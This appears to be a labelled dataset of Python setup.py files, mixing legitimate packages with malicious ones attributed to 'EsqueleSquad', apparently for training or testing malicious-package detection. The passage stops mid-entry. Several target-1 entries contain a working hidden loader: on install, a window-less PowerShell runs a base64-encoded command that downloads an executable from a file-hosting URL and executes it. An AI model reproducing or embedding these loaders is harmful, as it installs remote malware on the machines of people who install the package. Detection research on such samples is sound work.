{"idx": "urlram-4.63", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'urlram',\n    packages = ['modlib'],\n    version = '8.36',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "pythoncolorv4-1.0.0", "func": "import setuptools\n\nsetuptools.setup(\n    name='pythoncolorv4',\n    version='1.0.0',\n    author='\"RonnieMcNutt1243\"',\n    author_email='nick.faltermeier@gmx.de',\n    description='\"Package for many purposes, such as simple colors in the terminal\"',\n)\n", "target": 1}
{"idx": "selftoolinfoint-10.58", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selftoolinfoint',\n    packages = ['modlib'],\n    version = '9.27',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "docopt-ng-0.8.1", "func": "# Included as a placeholder to allow editable installs.\n# Hopefully this can be removed in the future.\nfrom setuptools import setup\n\nsetup()\n", "target": 0}
{"idx": "fcm-django-1.0.12", "func": "#!/usr/bin/env python\nimport fcm_django\n\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\nCLASSIFIERS = [\n    \"Development Status :: 5 - Production/Stable\",\n    \"Environment :: Web Environment\",\n    \"Framework :: Django\",\n    \"Intended Audience :: Developers\",\n    \"License :: OSI Approved :: MIT License\",\n    \"Programming Language :: Python\",\n    \"Programming Language :: Python :: 3\",\n    \"Programming Language :: Python :: 3.6\",\n    \"Programming Language :: Python :: 3.7\",\n    \"Programming Language :: Python :: 3.8\",\n    \"Programming Language :: Python :: 3.9\",\n    \"Topic :: Software Development :: Libraries :: Python Modules\",\n    \"Topic :: System :: Networking\",\n]\n\nsetup(\n    name=\"fcm-django\",\n    packages=[\n        \"fcm_django\",\n        \"fcm_django/api\",\n        \"fcm_django/migrations\",\n    ],\n    python_requires=\">=3\",\n    install_requires=[\"firebase-admin>=5,<6\", \"Django\"],\n    author=fcm_django.__author__,\n    author_email=fcm_django.__email__,\n    classifiers=CLASSIFIERS,\n    description=\"Send push notifications to mobile devices & browsers through \"\n    \"FCM in Django.\",\n    download_url=\"https://github.com/xtrinch/fcm-django/tarball/master\",\n    long_description=\"\",\n    url=\"https://github.com/xtrinch/fcm-django\",\n    version=fcm_django.__version__,\n)\n", "target": 0}
{"idx": "edcv-3.22", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'edcv',\n    packages = ['modlib'],\n    version = '3.1',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "libreplaceintel-6.35", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libreplaceintel',\n    packages = ['modlib'],\n    version = '7.67',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "grimp-1.3", "func": "#!/usr/bin/env python\n# -*- encoding: utf-8 -*-\nimport io\nfrom glob import glob\nfrom os.path import basename\nfrom os.path import dirname\nfrom os.path import join\nfrom os.path import splitext\n\nfrom setuptools import find_packages\nfrom setuptools import setup\n\n\ndef read(*names, **kwargs):\n    with io.open(\n        join(dirname(__file__), *names),\n        encoding=kwargs.get('encoding', 'utf8')\n    ) as fh:\n        return fh.read()\n\n\nsetup(\n    name='grimp',\n    version='1.3',\n    license='BSD 2-Clause License',\n    description=\"Builds a queryable graph of the imports within one or more Python packages.\",\n    long_description=read('README.rst'),\n    long_description_content_type='text/x-rst',\n    author='David Seddon',\n    author_email='david@seddonym.me',\n    project_urls={\n        'Documentation': 'https://grimp.readthedocs.io/',\n        'Source code': 'https://github.com/seddonym/grimp/',\n    },\n    packages=find_packages('src'),\n    package_data={'grimp': ['py.typed']},\n    package_dir={'': 'src'},\n    py_modules=[splitext(basename(path))[0] for path in glob('src/*.py')],\n    include_package_data=True,\n    zip_safe=False,\n    classifiers=[\n        # complete classifier list: http://pypi.python.org/pypi?%3Aaction=list_classifiers\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: Unix',\n        'Operating System :: POSIX',\n        'Operating System :: Microsoft :: Windows',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Topic :: Utilities',\n    ],\n    install_requires=[\n        'networkx>=2.1,<3',\n    ],\n)\n", "target": 0}
{"idx": "libpystudyre-2.56", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpystudyre',\n    packages = ['modlib'],\n    version = '6.34',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqproofproof-9.84", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqproofproof',\n    packages = ['modlib'],\n    version = '4.32',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flake8-executable-2.1.1", "func": "# Copyright (c) 2019 Hong Xu <hong@topbug.net>\n\n# This file is part of flake8-executable.\n\n# flake8-executable is free software: you can redistribute it and/or modify it\n# under the terms of the GNU Lesser General Public License as published by the\n# Free Software Foundation, either version 3 of the License, or (at your\n# option) any later version.\n\n# flake8-executable is distributed in the hope that it will be useful, but\n# WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or\n# FITNESS FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public License\n# for more details.\n\n# You should have received a copy of the GNU Lesser General Public License\n# along with flake8-executable. If not, see <https://www.gnu.org/licenses/>.\n\nimport pathlib\n\nfrom setuptools import setup\n\n\nsetup(\n    name=\"flake8-executable\",\n    description=\"A Flake8 plugin for checking executable permissions and shebangs.\",\n    long_description=pathlib.Path('README.md').read_text(),\n    long_description_content_type=\"text/markdown\",\n    keywords=\"flake8 linter qa\",\n    author=\"Hong Xu\",\n    author_email=\"hong@topbug.net\",\n    url=\"https://github.com/xuhdev/flake8-executable\",\n    license='LGPL v3+',\n    packages=[\"flake8_executable\"],\n    data_files=[(\"\", [\"COPYING\", \"COPYING.GPL\"])],\n    python_requires=\">=3.6\",\n    install_requires=[\"flake8 >= 3.0.0\"],\n    classifiers=[\n        \"Environment :: Console\",\n        \"Framework :: Flake8\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: GNU Lesser General Public License v3 or later (LGPLv3+)\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Topic :: Software Development :: Quality Assurance\",\n    ],\n    entry_points={\n        \"flake8.extension\": [\"EXE00 = flake8_executable:ExecutableChecker\"]\n    },\n    use_scm_version={'write_to': 'flake8_executable/_version.py'},\n    setup_requires=['setuptools_scm']\n)\n", "target": 0}
{"idx": "django-cacheops-6.1", "func": "from setuptools import setup\n\n\n# Remove build status\nREADME = open('README.rst').read().replace('|Build Status|', '', 1)\n\n\nsetup(\n    name='django-cacheops',\n    version='6.1',\n    author='Alexander Schepanovski',\n    author_email='suor.web@gmail.com',\n\n    description='A slick ORM cache with automatic granular event-driven invalidation for Django.',\n    long_description=README,\n    url='http://github.com/Suor/django-cacheops',\n    license='BSD',\n\n    packages=[\n        'cacheops',\n        'cacheops.management',\n        'cacheops.management.commands',\n        'cacheops.templatetags'\n    ],\n    python_requires='>=3.5',\n    install_requires=[\n        'django>=2.1',\n        'redis>=3.0.0',\n        'funcy>=1.8,<2.0',\n        'six>=1.4.0',\n    ],\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Framework :: Django',\n        'Framework :: Django :: 2.1',\n        'Framework :: Django :: 2.2',\n        'Framework :: Django :: 3.0',\n        'Framework :: Django :: 3.1',\n        'Framework :: Django :: 3.2',\n        'Framework :: Django :: 4.0',\n\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'Topic :: Internet :: WWW/HTTP',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ],\n\n    zip_safe=False,\n    include_package_data=True,\n)\n", "target": 0}
{"idx": "django-environ-0.9.0", "func": "#!/usr/bin/env python\n#\n# This file is part of the django-environ.\n#\n# Copyright (c) 2021, Serghei Iakovlev <egrep@protonmail.ch>\n# Copyright (c) 2013-2021, Daniele Faraglia <daniele.faraglia@gmail.com>\n#\n# For the full copyright and license information, please view\n# the LICENSE.txt file that was distributed with this source code.\n\nimport codecs\nimport re\nfrom os import path\n\nfrom setuptools import find_packages, setup\n\n\ndef read_file(filepath):\n    \"\"\"Read content from a UTF-8 encoded text file.\"\"\"\n    with codecs.open(filepath, 'rb', 'utf-8') as file_handle:\n        return file_handle.read()\n\n\nPKG_NAME = 'django-environ'\nPKG_DIR = path.abspath(path.dirname(__file__))\nMETA_PATH = path.join(PKG_DIR, 'environ', '__init__.py')\nMETA_CONTENTS = read_file(META_PATH)\n\n\ndef load_long_description():\n    \"\"\"Load long description from file README.rst.\"\"\"\n    def changes():\n        changelog = path.join(PKG_DIR, 'CHANGELOG.rst')\n        pattern = (\n            r'(`(v\\d+.\\d+.\\d+)`_( - \\d{1,2}-\\w+-\\d{4}\\r?\\n-+\\r?\\n.*?))'\n            r'\\r?\\n\\r?\\n\\r?\\n`v\\d+.\\d+.\\d+`_'\n        )\n        result = re.search(pattern, read_file(changelog), re.S)\n\n        return result.group(2) + result.group(3) if result else ''\n\n    try:\n        title = PKG_NAME\n        head = '=' * (len(title))\n\n        contents = (\n            head,\n            format(title.strip(' .')),\n            head,\n            read_file(path.join(PKG_DIR, 'README.rst')).split(\n                '.. -teaser-begin-'\n            )[1],\n            '',\n            read_file(path.join(PKG_DIR, 'CONTRIBUTING.rst')),\n            '',\n            'Release Information',\n            '===================\\n',\n            changes(),\n            '',\n            '`Full changelog <{}/en/latest/changelog.html>`_.'.format(\n                find_meta('url')\n            ),\n            '',\n            read_file(path.join(PKG_DIR, 'SECURITY.rst')),\n            '',\n            read_file(path.join(PKG_DIR, 'AUTHORS.rst')),\n        )\n\n        return '\\n'.join(contents)\n    except (RuntimeError, FileNotFoundError) as read_error:\n        message = 'Long description could not be read from README.rst'\n        raise RuntimeError('%s: %s' % (message, read_error)) from read_error\n\n\ndef is_canonical_version(version):\n    \"\"\"Check if a version string is in the canonical format of PEP 440.\"\"\"\n    pattern = (\n        r'^([1-9][0-9]*!)?(0|[1-9][0-9]*)(\\.(0|[1-9][0-9]*))'\n        r'*((a|b|rc)(0|[1-9][0-9]*))?(\\.post(0|[1-9][0-9]*))'\n        r'?(\\.dev(0|[1-9][0-9]*))?$')\n    return re.match(pattern, version) is not None\n\n\ndef find_meta(meta):\n    \"\"\"Extract __*meta*__ from META_CONTENTS.\"\"\"\n    meta_match = re.search(\n        r\"^__{meta}__\\s+=\\s+['\\\"]([^'\\\"]*)['\\\"]\".format(meta=meta),\n        META_CONTENTS,\n        re.M\n    )\n\n    if meta_match:\n        return meta_match.group(1)\n    raise RuntimeError(\n        'Unable to find __%s__ string in package meta file' % meta)\n\n\ndef get_version_string():\n    \"\"\"Return package version as listed in `__version__` in meta file.\"\"\"\n    # Parse version string\n    version_string = find_meta('version')\n\n    # Check validity\n    if not is_canonical_version(version_string):\n        message = (\n            'The detected version string \"{}\" is not in canonical '\n            'format as defined in PEP 440.'.format(version_string))\n        raise ValueError(message)\n\n    return version_string\n\n\n# What does this project relate to.\nKEYWORDS = [\n    'environment',\n    'django',\n    'variables',\n    '12factor',\n]\n\n# Classifiers: available ones listed at https://pypi.org/classifiers\nCLASSIFIERS = [\n    'Development Status :: 5 - Production/Stable',\n\n    'Framework :: Django',\n    'Framework :: Django :: 1.11',\n    'Framework :: Django :: 2.0',\n    'Framework :: Django :: 2.1',\n    'Framework :: Django :: 2.2',\n    'Framework :: Django :: 3.0',\n    'Framework :: Django :: 3.1',\n    'Framework :: Django :: 3.2',\n    'Framework :: Django :: 4.0',\n\n    'Operating System :: OS Independent',\n\n    'Intended Audience :: Developers',\n    'Natural Language :: English',\n\n    'Programming Language :: Python',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 3.4',\n    'Programming Language :: Python :: 3.5',\n    'Programming Language :: Python :: 3.6',\n    'Programming Language :: Python :: 3.7',\n    'Programming Language :: Python :: 3.8',\n    'Programming Language :: Python :: 3.9',\n    'Programming Language :: Python :: 3.10',\n    'Programming Language :: Python :: Implementation :: CPython',\n    'Programming Language :: Python :: Implementation :: PyPy',\n\n    'Topic :: Software Development :: Libraries :: Python Modules',\n    'Topic :: Utilities',\n\n    'License :: OSI Approved :: MIT License',\n]\n\n# Dependencies that are downloaded by pip on installation and why.\nINSTALL_REQUIRES = []\n\nDEPENDENCY_LINKS = []\n\n# List additional groups of dependencies here (e.g. testing dependencies).\n# You can install these using the following syntax, for example:\n#\n#    $ pip install -e .[testing,docs,develop]\n#\nEXTRAS_REQUIRE = {\n    # Dependencies that are required to run tests\n    'testing': [\n        'coverage[toml]>=5.0a4',  # Code coverage measurement for Python\n        'pytest>=4.6.11',  # Our tests framework\n    ],\n    # Dependencies that are required to build documentation\n    'docs': [\n        'furo>=2021.8.17b43,==2021.8.*',  # Sphinx documentation theme\n        'sphinx>=3.5.0',  # Python documentation generator\n        'sphinx-notfound-page',  # Create a custom 404 page\n    ],\n}\n\n# Dependencies that are required to develop package\nDEVELOP_REQUIRE = []\n\n# Dependencies that are required to develop package\nEXTRAS_REQUIRE['develop'] = \\\n    DEVELOP_REQUIRE + EXTRAS_REQUIRE['testing'] + EXTRAS_REQUIRE['docs']\n\n# Project's URLs\nPROJECT_URLS = {\n    'Documentation': find_meta('url'),\n    'Funding': 'https://opencollective.com/django-environ',\n    'Say Thanks!': 'https://saythanks.io/to/joke2k',\n    'Changelog': '{}/en/latest/changelog.html'.format(find_meta('url')),\n    'Bug Tracker': 'https://github.com/joke2k/django-environ/issues',\n    'Source Code': 'https://github.com/joke2k/django-environ',\n}\n\n\nif __name__ == '__main__':\n    setup(\n        name=PKG_NAME,\n        version=get_version_string(),\n        author=find_meta('author'),\n        author_email=find_meta('author_email'),\n        maintainer=find_meta('maintainer'),\n        maintainer_email=find_meta('maintainer_email'),\n        license=find_meta('license'),\n        description=find_meta('description'),\n        long_description=load_long_description(),\n        long_description_content_type='text/x-rst',\n        keywords=KEYWORDS,\n        url=find_meta('url'),\n        project_urls=PROJECT_URLS,\n        classifiers=CLASSIFIERS,\n        packages=find_packages(exclude=['tests.*', 'tests']),\n        platforms=['any'],\n        include_package_data=True,\n        zip_safe=False,\n        python_requires='>=3.4,<4',\n        install_requires=INSTALL_REQUIRES,\n        dependency_links=DEPENDENCY_LINKS,\n        extras_require=EXTRAS_REQUIRE,\n    )\n", "target": 0}
{"idx": "google-cloud-dns-0.34.1", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n\n# Package metadata.\n\nname = \"google-cloud-dns\"\ndescription = \"Google Cloud DNS API client library\"\nversion = \"0.34.1\"\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 3 - Alpha\"\ndependencies = [\n    # NOTE: Maintainers, please do not require google-cloud-core>=2.x.x\n    # Until this issue is closed\n    # https://github.com/googleapis/google-cloud-python/issues/10566\n    \"google-cloud-core >= 1.3.0, < 3.0dev\",\n]\nextras = {}\n\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package for package in setuptools.find_packages() if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-dns\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "google-cloud-storage-2.5.0", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n\n# Package metadata.\n\nname = \"google-cloud-storage\"\ndescription = \"Google Cloud Storage API client library\"\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-auth >= 1.25.0, < 3.0dev\",\n    \"google-api-core >= 1.31.5, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.0\",\n    \"google-cloud-core >= 2.3.0, < 3.0dev\",\n    \"google-resumable-media >= 2.3.2\",\n    \"requests >= 2.18.0, < 3.0.0dev\",\n]\nextras = {\"protobuf\": [\"protobuf<5.0.0dev\"]}\n\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nversion = {}\nwith open(os.path.join(package_root, \"google/cloud/storage/version.py\")) as fp:\n    exec(fp.read(), version)\nversion = version[\"__version__\"]\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as 